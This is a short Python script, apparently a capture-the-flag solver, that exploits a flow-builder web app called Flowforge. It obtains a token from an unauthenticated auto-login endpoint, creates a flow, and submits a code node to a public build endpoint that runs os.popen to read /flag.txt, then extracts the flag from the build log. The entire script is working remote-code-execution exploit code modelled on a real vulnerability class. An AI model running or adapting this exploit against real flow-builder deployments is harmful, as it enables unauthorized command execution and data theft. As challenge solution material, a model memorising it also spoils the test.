#!/usr/bin/env python3
"""Flowforge solver — unauth code injection -> RCE (CVE-2026-33017 style)."""
import json
import re
import sys
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 11026
BASE = 'http://%s:%d' % (HOST, PORT)


def get(path, headers=None):
    req = urllib.request.Request(BASE + path, headers=headers or {})
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read().decode())


def post(path, data, headers=None):
    h = {'Content-Type': 'application/json'}
    h.update(headers or {})
    req = urllib.request.Request(BASE + path, data=json.dumps(data).encode(),
                                 headers=h, method='POST')
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read().decode())


def main():
    tok = get('/api/v1/auto_login')['access_token']
    print('[1] token:', tok[:8] + '...')
    flow = post('/api/v1/flows/', {'name': 'x'},
                {'Authorization': 'Bearer ' + tok})
    fid = flow['id']
    print('[2] flow id:', fid)

    code = "import os\nprint(getattr(os, 'popen')('cat /flag.txt').read())"
    body = {
        'data': {
            'nodes': [
                {'id': 'n1', 'data': {'type': 'code',
                                      'template': {'code': {'value': code}}}},
            ],
        },
    }
    resp = post('/api/v1/build_public_tmp/%s/flow' % fid, body)
    print('[3] build status:', resp.get('status'))
    m = re.search(r'CODEX26\{[^}]+\}', resp.get('log', ''))
    if m:
        print('FLAG:', m.group(0))
    else:
        print('log:', repr(resp.get('log', '')))


if __name__ == '__main__':
    main()
